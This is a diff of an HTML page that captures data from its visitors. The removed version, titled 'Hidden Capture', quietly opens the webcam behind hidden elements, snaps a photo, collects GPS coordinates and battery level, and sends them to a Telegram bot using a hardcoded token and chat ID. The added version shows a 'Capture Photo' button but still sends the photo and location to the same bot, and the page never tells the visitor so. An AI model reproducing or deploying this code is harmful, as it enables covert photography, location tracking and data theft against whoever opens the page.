@@ -3,62 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hidden Capture</title>
+    <title>Capture User Data</title>
     <style>
-        body { background-color: black; margin: 0; height: 100vh; overflow: hidden; }
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+        }
+        #camera {
+            margin: 20px auto;
+            width: 320px;
+            height: 240px;
+            border: 2px solid white;
+        }
+        #capture {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 16px;
+        }
     </style>
 </head>
 <body>
-    <video id="video" autoplay style="display: none;"></video>
-    <canvas id="canvas" width="300" height="200" style="display: none;"></canvas>
+    <h1>Capture Your Photo</h1>
+    <div id="camera">
+        <video id="video" width="320" height="240" autoplay></video>
+        <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    </div>
+    <button id="capture">Capture Photo</button>
+    <p id="location"></p>
+    <p id="battery"></p>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
-        const TELEGRAM_CHAT_ID = "@BERLIN_IS_BERLIN";  // 🔴 @username se direct nahi bhej sakte, ID chahiye
+        // Access the camera
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureButton = document.getElementById('capture');
+        const locationInfo = document.getElementById('location');
+        const batteryInfo = document.getElementById('battery');
 
-        let video = document.getElementById("video");
-        let canvas = document.getElementById("canvas");
-        let context = canvas.getContext("2d");
-
-        // 🚀 **Camera Access & Capture Photo**
-        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-            video.srcObject = stream;
-            setTimeout(() => {
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                let imageData = canvas.toDataURL("image/png");
-                video.srcObject.getTracks().forEach(track => track.stop()); // 📌 Camera Stop
-                sendToTelegram(imageData);
-            }, 2000); // 🔥 2 sec ke andar photo capture
-        }).catch(err => console.log("Camera blocked!"));
-
-        // 🚀 **Battery & Location Fetch**
-        let batteryLevel = "Unknown";
-        navigator.getBattery().then(battery => {
-            batteryLevel = `${Math.round(battery.level * 100)}%`;
-        });
-
-        let locationData = "Unknown";
-        navigator.geolocation.getCurrentPosition(position => {
-            locationData = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
-        });
-
-        // 🚀 **Send Data to Telegram**
-        function sendToTelegram(imageData) {
-            let message = `📸 **User Details**\n🔋 Battery: ${batteryLevel}\n📍 Location: ${locationData}`;
-
-            // 🔹 Text Data Send
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" })
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+            })
+            .catch((err) => {
+                console.error("Error accessing the camera: ", err);
             });
 
-            // 🔹 Photo Send (Backend Server Needed)
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, photo: imageData }),
-                headers: { "Content-Type": "application/json" }
-            }).catch(error => console.log("Photo sending error:", error));
+        // Capture photo
+        captureButton.addEventListener('click', () => {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 320, 240);
+            const imageData = canvas.toDataURL('image/png');
+
+            // Get location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    locationInfo.textContent = `Location: Latitude ${latitude}, Longitude ${longitude}`;
+
+                    // Get battery status
+                    navigator.getBattery().then((battery) => {
+                        const batteryLevel = battery.level * 100;
+                        batteryInfo.textContent = `Battery: ${batteryLevel}%`;
+
+                        // Send data to Telegram bot
+                        sendDataToTelegram(imageData, latitude, longitude, batteryLevel);
+                    });
+                });
+            } else {
+                locationInfo.textContent = "Geolocation is not supported by this browser.";
+            }
+        });
+
+        function sendDataToTelegram(imageData, latitude, longitude, batteryLevel) {
+            const botToken = '7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4';
+            const chatId = '@BERLIN_IS_BERLIN';
+            const message = `Location: Latitude ${latitude}, Longitude ${longitude}\nBattery: ${batteryLevel}%`;
+
+            // Send image and message to Telegram bot
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', imageData);
+            formData.append('caption', message);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
         }
     </script>
 </body>
